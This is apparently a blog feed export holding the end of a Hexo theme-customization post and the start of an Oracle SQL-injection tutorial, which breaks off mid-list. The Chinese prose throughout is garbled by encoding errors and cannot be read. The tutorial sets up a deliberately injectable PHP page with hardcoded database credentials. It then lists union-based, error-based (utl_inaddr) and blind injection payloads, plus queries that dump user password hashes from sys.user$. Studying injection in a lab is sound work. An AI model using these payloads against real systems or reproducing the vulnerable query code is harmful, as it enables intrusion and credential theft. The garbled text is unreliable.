<h2 id="åº•éƒ¨ä¿¡æ¯ä¿®æ”¹"><a href="#åº•éƒ¨ä¿¡æ¯ä¿®æ”¹" class="headerlink" title="åº•éƒ¨ä¿¡æ¯ä¿®æ”¹"></a>åº•éƒ¨ä¿¡æ¯ä¿®æ”¹</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line">powered: <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>åº•éƒ¨è¿è¡Œæ—¶é—´ä»¥åŠè®¿é—®æ•°<code>/themes/next/layout/_partials/footer.swig</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® --&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;timeDate&quot;</span>&gt;è½½å…¥å¤©æ•°...&lt;/span&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;times&quot;</span>&gt;è½½å…¥æ—¶åˆ†ç§’...&lt;/span&gt;  </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createtime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> grt= <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&quot;03/03/2020 13:14:21&quot;</span>);<span class="comment">//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´</span></span><br><span class="line">        now.setTime(now.getTime()+<span class="number">250</span>);</span><br><span class="line">        days = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>; dnum = <span class="built_in">Math</span>.floor(days);</span><br><span class="line">        hours = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> - (<span class="number">24</span> * dnum); hnum = <span class="built_in">Math</span>.floor(hours);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">String</span>(hnum).length ==<span class="number">1</span> )&#123;hnum = <span class="string">&quot;0&quot;</span> + hnum;&#125; minutes = (now - grt ) / <span class="number">1000</span> /<span class="number">60</span> - (<span class="number">24</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * hnum);</span><br><span class="line">        mnum = <span class="built_in">Math</span>.floor(minutes); <span class="keyword">if</span>(<span class="built_in">String</span>(mnum).length ==<span class="number">1</span> )&#123;mnum = <span class="string">&quot;0&quot;</span> + mnum;&#125;</span><br><span class="line">        seconds = (now - grt ) / <span class="number">1000</span> - (<span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * <span class="number">60</span> * hnum) - (<span class="number">60</span> * mnum);</span><br><span class="line">        snum = <span class="built_in">Math</span>.round(seconds); <span class="keyword">if</span>(<span class="built_in">String</span>(snum).length ==<span class="number">1</span> )&#123;snum = <span class="string">&quot;0&quot;</span> + snum;&#125;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;timeDate&quot;</span>).innerHTML = <span class="string">&quot;æœ¬ç«™å·²å®‰å…¨è¿è¡Œ &quot;</span>+dnum+<span class="string">&quot; å¤© &quot;</span>;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;times&quot;</span>).innerHTML = hnum + <span class="string">&quot; å°æ—¶ &quot;</span> + mnum + <span class="string">&quot; åˆ† &quot;</span> + snum + <span class="string">&quot; ç§’&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="string">&quot;createtime()&quot;</span>,<span class="number">250</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>é…ç½®åº•éƒ¨è®¿é—®<code>themes\next\_config.yml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true</span><br><span class="line">  total_visitors: true</span><br><span class="line">  total_visitors_icon: user</span><br><span class="line">  total_views: true</span><br><span class="line">  total_views_icon: eye</span><br><span class="line">  post_views: true</span><br><span class="line">  post_views_icon: eye</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ç« åŠ å¯†"><a href="#æ–‡ç« åŠ å¯†" class="headerlink" title="æ–‡ç« åŠ å¯†"></a>æ–‡ç« åŠ å¯†</h2><p>æ‰“å¼€<code>themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig</code>æ–‡ä»¶,åœ¨ä»¥ä¸‹ä½ç½®æ’å…¥è¿™æ ·ä¸€æ®µä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=2&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;theme-color&quot;</span> content=<span class="string">&quot;&#123;&#123; theme.android_chrome_color &#125;&#125;&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;&#123;&#123; page.password &#125;&#125;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (prompt(<span class="string">&#x27;è¯·è¾“å…¥æ–‡ç« å¯†ç &#x27;</span>) !== <span class="string">&#x27;&#123;&#123; page.password &#125;&#125;&#x27;</span>)&#123;</span><br><span class="line">                alert(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨æ‰€æœ‰çš„éœ€è¦åŠ å¯†æ–‡ç« çš„å¤´éƒ¨ä¿¡æ¯ä¸­æ·»åŠ <code>password: 123456</code>å³å¯ä½¿ç”¨å¯†ç åŠ å¯†ã€‚</p>
<h2 id="æ–‡ç« å›¾ç‰‡å¤„ç†"><a href="#æ–‡ç« å›¾ç‰‡å¤„ç†" class="headerlink" title="æ–‡ç« å›¾ç‰‡å¤„ç†"></a>æ–‡ç« å›¾ç‰‡å¤„ç†</h2><p>å›¾ç‰‡è·¯å¾„é—®é¢˜ï¼Œ<code>hexo new post &quot;æ–‡ç« å&quot;</code>ä¼šåœ¨åŒç›®å½•ä¸‹ç”Ÿè¾°åŒåæ–‡ä»¶å¤¹ç”¨æ¥å­˜æ”¾å›¾ç‰‡ã€‚ä½¿ç”¨å›¾ç‰‡æ˜¯ç›´æ¥æ–‡ä»¶åå³å¯ã€‚</p>
<ul>
<li><code>npm install hexo-asset-image --save</code></li>
<li>é…ç½®æ–‡ä»¶ post_asset_folderï¼ŒæŠŠè¿™ä¸ªé€‰é¡¹ä»falseæ”¹æˆtrue</li>
<li><code>/Users/lnx/Desktop/blog/node_modules/hexo-asset-image/index.js</code>ä¿®æ”¹ä¸ºå¦‚ä¸‹</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">str, m, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="built_in">String</span>(hexo.version).split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">hexo.extend.filter.register(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.config;</span><br><span class="line">  <span class="keyword">if</span>(config.post_asset_folder)&#123;</span><br><span class="line">        <span class="keyword">var</span> link = data.permalink;</span><br><span class="line">    <span class="keyword">if</span>(version.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>)</span><br><span class="line">       <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="keyword">var</span> endPos = link.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    link = link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: <span class="literal">false</span>,</span><br><span class="line">        xmlMode: <span class="literal">false</span>,</span><br><span class="line">        lowerCaseTags: <span class="literal">false</span>,</span><br><span class="line">        decodeEntities: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line">            <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">            <span class="keyword">var</span> src = $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;</span><br><span class="line">               !<span class="regexp">/^\s*\//</span>.test(src)) &#123;</span><br><span class="line">              <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">              <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">              <span class="keyword">var</span> linkArray = link.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">var</span> srcArray = src.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">if</span>(srcArray.length &gt; <span class="number">1</span>)</span><br><span class="line">                srcArray.shift();</span><br><span class="line">              src = srcArray.join(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">              $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class="line">              <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info($(<span class="built_in">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¹‹åå³å¯å‡ºé‡‡ç”¨<code>![æè¿°](1.png)</code></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>åšå®¢æ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracleå°ç»“</title>
    <url>/posts/bb8356a5/</url>
    <content><![CDATA[<p>Oracleæ³¨å…¥å¸¸ç”¨æ–¹æ³•ä¸å‘½ä»¤æ‰§è¡Œçš„å¸¸ç”¨æ–¹æ³•ã€‚</p>
<a id="more"></a>

<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li><p>oracle</p>
<p>è¿™é‡Œæµ‹è¯•ç¯å¢ƒç‰ˆæœ¬ï¼š<code>Oracle Database 11g Release 11.2.0.1.0 - 64bit Production</code></p>
</li>
<li><p>PHP</p>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯æœ€æ–°ç‰ˆçš„PHPSTUDY V8.1ï¼Œé»˜è®¤å®‰è£…çš„PHPç‰ˆæœ¬ä¸º7.3ï¼Œä¸‹è½½PHPçš„å…³äºoracleçš„ç»„ä»¶ã€‚å°†<code>php_oci8_11g.dll</code>,<code>php_oci8.dll</code>æ”¾åœ¨PHPå®‰è£…æ–‡ä»¶å¤¹çš„extæ–‡ä»¶å¤¹ä¸‹ã€‚ç„¶åå†php.iniä¸­å¼€å¯å¦‚ä¸‹è®¾ç½®ï¼š</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extension&#x3D;php_oci8.dll</span><br><span class="line">extension&#x3D;php_oci8_11g.dll</span><br><span class="line"># æŸ¥çœ‹phpinfoæ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°OCI8å³å¯ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/001.png" alt="image-20200602112233342"></p>
<h3 id="æ³¨å…¥ç‚¹æ„å»º"><a href="#æ³¨å…¥ç‚¹æ„å»º" class="headerlink" title="æ³¨å…¥ç‚¹æ„å»º"></a>æ³¨å…¥ç‚¹æ„å»º</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">///*</span></span><br><span class="line">$con = oci_connect(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;127.0.0.1/orcl.unicodesec&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($con)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;connected &quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Input:&quot;</span>.$id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	$sql = <span class="string">&quot;select id,username,password,phone from admin where id = &quot;</span>.$id;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$sql.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$stmt = oci_parse($con, $sql);</span><br><span class="line">	oci_execute($stmt);</span><br><span class="line">	$nrows = oci_fetch_all($stmt, $results);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($nrows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;table border=\&quot;1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($results <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;th&gt;<span class="subst">$key</span>&lt;/th&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $nrows; $i++) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($results <span class="keyword">as</span> $data) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">$data</span>[<span class="subst">$i</span>]&lt;/td&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;\n&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;No data found&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/002.png" alt="image-20200602144555521"></p>
<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Oracle Databaseï¼ŒåˆåOracle RDBMSï¼Œæˆ–ç®€ç§°Oracleã€‚æ˜¯<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTklQUElQTglRTYlOTYlODclRTUlODUlQUMlRTUlOEYlQjgvNDMwMTE1">ç”²éª¨æ–‡å…¬å¸<i class="fa fa-external-link-alt"></i></span>çš„ä¸€æ¬¾<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlQjMlRTclQjMlQkIlRTYlOTUlQjAlRTYlOEQlQUUlRTUlQkElOTMlRTclQUUlQTElRTclOTAlODYlRTclQjMlQkIlRTclQkIlOUYvMTEwMzIzODY=">å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ<i class="fa fa-external-link-alt"></i></span>ã€‚å®ƒæ˜¯åœ¨æ•°æ®åº“é¢†åŸŸä¸€ç›´å¤„äºé¢†å…ˆåœ°ä½çš„äº§å“ã€‚å¯ä»¥è¯´Oracleæ•°æ®åº“ç³»ç»Ÿæ˜¯ç›®å‰ä¸–ç•Œä¸Šæµè¡Œçš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç³»ç»Ÿå¯ç§»æ¤æ€§å¥½ã€ä½¿ç”¨æ–¹ä¾¿ã€åŠŸèƒ½å¼ºï¼Œé€‚ç”¨äºå„ç±»å¤§ã€ä¸­ã€å°ã€å¾®æœºç¯å¢ƒã€‚å®ƒæ˜¯ä¸€ç§é«˜æ•ˆç‡ã€å¯é æ€§å¥½çš„ã€é€‚åº”é«˜ååé‡çš„æ•°æ®åº“æ–¹æ¡ˆã€‚</p>
<h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><ul>
<li>select å¿…é¡»è¦æŒ‡æ˜è¡¨åã€‚è‹¥å¹¶éå¯¹çœŸå®çš„è¡¨è¿›è¡ŒæŸ¥è¯¢ï¼Œåˆ™éœ€è¦ç”¨ <code>dual</code> ä½œä¸ºè¡¨åã€‚</li>
<li>å•å¼•å·ä¸åŒå¼•å·ï¼šOracle çš„å•å¼•å·ä¸ MySQL ä¸€è‡´ï¼Œä½†æ˜¯åŒå¼•å·ç”¨äºæ¶ˆé™¤ç³»ç»Ÿå…³é”®å­—ã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸ªè¡¨çš„å­—æ®µå«<code>sysdate</code>ï¼Œå› ä¸º<code>sysdate</code>å±äº<code>oracle</code>ä¸­çš„å…³é”®å­—ï¼Œä½†ä½ è¦æŸ¥è¯¢è¿™ä¸ªå­—æ®µçš„æ—¶å€™ï¼Œå°±éœ€è¦<code>select &quot;sysdate&quot; from dual;</code>ï¼Œè‹¥ç”¨ <code>select &#39;sysdate&#39; from table_name;</code>æŸ¥è¯¢å°±ç›¸å½“äº <code>select sysdate from table_name;</code>ï¼Œè€Œ<code>sysdate</code> ç”¨äºè·å¾—å½“å‰æ—¶é—´ã€‚</li>
<li>ç¬¬ n è¡Œçš„æ•°æ®ï¼š<code>SELECT colmn_name FROM (SELECT ROWNUM r, table_name FROM users ORDER BY colmn_name) WHERE r=n;</code>ã€‚</li>
<li>æ‹¼æ¥å­—ç¬¦ï¼š<code>SELECT &#39;a&#39; || &#39;b&#39; FROM dual;</code>ã€‚</li>
<li><code>case è¯­æ³•</code>ï¼š<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code>ã€‚</li>
<li>Oracle ä¸­ç©ºå­—ç¬¦ä¸²<code>&#39;&#39;</code>å°±æ˜¯<code>null</code>ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰<code>null</code>ï¼Œæ²¡æœ‰ç©ºå­—ç¬¦ï¼‰ã€‚</li>
</ul>
<h3 id="ç³»ç»Ÿè¡¨"><a href="#ç³»ç»Ÿè¡¨" class="headerlink" title="ç³»ç»Ÿè¡¨"></a>ç³»ç»Ÿè¡¨</h3><ul>
<li>dba_tables : ç³»ç»Ÿé‡Œæ‰€æœ‰çš„è¡¨çš„ä¿¡æ¯ï¼Œéœ€è¦DBAæƒé™æ‰èƒ½æŸ¥è¯¢</li>
<li>all_tables : å½“å‰ç”¨æˆ·æœ‰æƒé™çš„è¡¨çš„ä¿¡æ¯ï¼ˆåªè¦å¯¹æŸä¸ªè¡¨æœ‰ä»»ä½•æƒé™ï¼Œå³å¯åœ¨æ­¤è§†å›¾ä¸­çœ‹åˆ°è¡¨çš„ç›¸å…³ä¿¡æ¯ï¼‰</li>
<li>user_tables: å½“å‰ç”¨æˆ·åä¸‹çš„è¡¨çš„ä¿¡æ¯</li>
<li>DBA_ALL_TABLESï¼š<code>DBA</code> ç”¨æˆ·æ‰€æ‹¥æœ‰çš„æˆ–æœ‰è®¿é—®æƒé™çš„å¯¹è±¡å’Œè¡¨</li>
<li>ALL_ALL_TABLESï¼šæŸä¸€ç”¨æˆ·æ‹¥æœ‰çš„æˆ–æœ‰è®¿é—®æƒé™çš„å¯¹è±¡å’Œè¡¨</li>
<li>USER_ALL_TABLESï¼šæŸä¸€ç”¨æˆ·æ‰€æ‹¥æœ‰çš„å¯¹è±¡å’Œè¡¨</li>
</ul>
<h3 id="è·å–æ•°æ®åº“ä¿¡æ¯"><a href="#è·å–æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="è·å–æ•°æ®åº“ä¿¡æ¯"></a>è·å–æ•°æ®åº“ä¿¡æ¯</h3><ul>
<li>æœåŠ¡å™¨ç‰ˆæœ¬ï¼š<code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code> æˆ–è€… <code>SELECT version FROM v$instance;</code>ã€‚</li>
<li>æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š<code>SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</code>ã€‚</li>
<li>å½“å‰æ•°æ®åº“ï¼š<code>SELECT global_name FROM global_name;</code> æˆ–è€… <code>SELECT name FROM v$database;</code>æˆ–è€…<code>SELECT instance_name FROM v$instance;</code>æˆ–è€…<code>SELECT SYS.DATABASE_NAME FROM DUAL;</code>ã€‚</li>
<li>è·å–å½“å‰ç”¨æˆ·æƒé™çš„æ‰€æœ‰æ•°æ®åº“ï¼š<code>SELECT DISTINCT owner, table_name FROM all_tables;</code></li>
<li>è¡¨åï¼š<code>SELECT table_name FROM all_tables;</code>ã€‚</li>
<li>å­—æ®µåï¼š<code>SELECT column_name FROM all_tab_columns</code>ã€‚</li>
</ul>
<h3 id="è·å–ç”¨æˆ·ä¿¡æ¯"><a href="#è·å–ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="è·å–ç”¨æˆ·ä¿¡æ¯"></a>è·å–ç”¨æˆ·ä¿¡æ¯</h3><p>æè¿°ï¼š<code>Oracle</code>ã€‚</p>
<ul>
<li>å½“å‰æ•°æ®åº“ç”¨æˆ·ï¼š<code>SELECT user FROM dual;</code>ã€‚</li>
<li>æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·ï¼š<code>SELECT username FROM all_users ORDER BY username;</code> æˆ–è€… <code>SELECT name FROM sys.user$; -- priv</code>ã€‚</li>
<li>æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·çš„å¯†ç  hashï¼š<code>SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g</code> æˆ–è€… <code>SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g</code>ã€‚</li>
<li>å½“å‰ç”¨æˆ·çš„æƒé™ï¼š<code>SELECT * FROM session_privs;</code>ã€‚</li>
<li>æ‰€æœ‰ç”¨æˆ·çš„æƒé™ï¼š<code>SELECT * FROM dba_sys_privs -- priv</code>ã€‚</li>
<li>ç”¨æˆ·è§’è‰²ï¼š<code>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</code> æˆ–è€… <code>SELECT DISTINCT grantee FROM dba_sys_privs</code>ã€‚</li>
</ul>
<h2 id="Oracleæ³¨å…¥"><a href="#Oracleæ³¨å…¥" class="headerlink" title="Oracleæ³¨å…¥"></a>Oracleæ³¨å…¥</h2><p>æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤çš„æƒ…å†µä¸‹ï¼ŒSqlmapä¸€æŠŠæ¢­æ˜¯æœ€å¿«çš„ã€‚ä¸è¿‡ï¼Œè¿˜æ˜¯éœ€è¦äº†è§£ä¸€ä¸‹å¸¸ç”¨çš„Oracleæ³¨å…¥æ–¹å¼ã€‚</p>
<h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>ç›´æ¥æ¥å°±å¥½äº†ï¼Œæ¯•ç«Ÿé¡µé¢æ˜¾ç¤ºã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://172.16.49.137/oracle.php?id=1 union <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">user</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.16</span><span class="number">.49</span><span class="number">.137</span>/oracle.php?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> utl_inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/003.png" alt="image-20200702172913714"></p>
<ul>
<li><code>decode</code>å‡½æ•°ï¼Œå¦‚æœæ­£ç¡®åˆ™ä¸º1ï¼Œé”™è¯¯ä¸º2ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select decode(substr(user, 1, 1), &#39;t&#39;, (1&#x2F;1),2) from dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>instr</code>åˆ¤æ–­ç»™å‡ºçš„å­—ç¬¦ä¸²1æ˜¯å¦åœ¨å­—ç¬¦ä¸²2ä¸­ã€‚æ­£ç¡®ä¸º1ï¼Œé”™è¯¯ä¸º0.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select instr((select user from dual),&#39;admin&#39;) FROM dual;</span><br></pre></td></tr></table></figure>

<ul>
